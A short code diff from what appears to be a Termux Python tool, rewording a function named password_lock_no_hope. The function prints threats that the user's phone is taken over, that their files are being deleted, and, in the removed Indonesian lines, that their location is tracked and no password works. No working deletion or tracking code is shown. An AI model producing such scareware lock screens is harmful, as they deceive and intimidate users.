@@ -480,17 +480,14 @@ def password_lock_no_hope():
     bold_red_print(f"\n{'='*70}")
     bold_red_print(f"   ⚠️  PERINGATAN! PERINGATAN! PERINGATAN!  ⚠️")
     bold_red_print(f"{'='*70}")
-    bold_red_print(f"\n💀 ANDA TELAH MENJALANKAN DFISH ILEGAL 💀")
-    bold_red_print(f"📱 SEMUA DATA ANDA SEDANG DIHAPUS PERMANEN 📱")
-    bold_red_print(f"👁️  LOKASI ANDA TELAH DILACAK 👁️")
-    bold_red_print(f"🔒 TERMUX TIDAK DAPAT DITUTUP ATAU DIHENTIKAN")
+    bold_red_print(f"\n❗YOUR PHONE IS TAKEOVER❗")
+    bold_red_print(f"❗ ALL DATA IS BEING PERMANENTLY DELETED ❗")
+    bold_red_print(f"🔒 LOCK PHONE SYSTEM")
     bold_red_print(f"\n{'='*70}")
-    bold_red_print(f"⚠️  PERHATIAN: TIDAK ADA PASSWORD YANG BENAR ⚠️")
-    bold_red_print(f"⚠️  APAPUN YANG ANDA MASUKKAN, DATA TETAP HILANG ⚠️")
     bold_red_print(f"{'='*70}\n")
     
-    bold_red_print("[💀] PROSES PENGHAPUSAN SEDANG BERJALAN DI BACKGROUND [💀]")
-    bold_red_print("[💀] FILE-FILE ANDA SEDANG DIHAPUS SATU PERSATU [💀]\n")
+    bold_red_print("[💀] ACTIVATED DELETING FILE [💀]")
+    bold_red_print("[💀] FILE-FILE ANDA SEDANG DIVERIFIKASI SATU PERSATU [💀]\n")
     
     attempts = 0
     
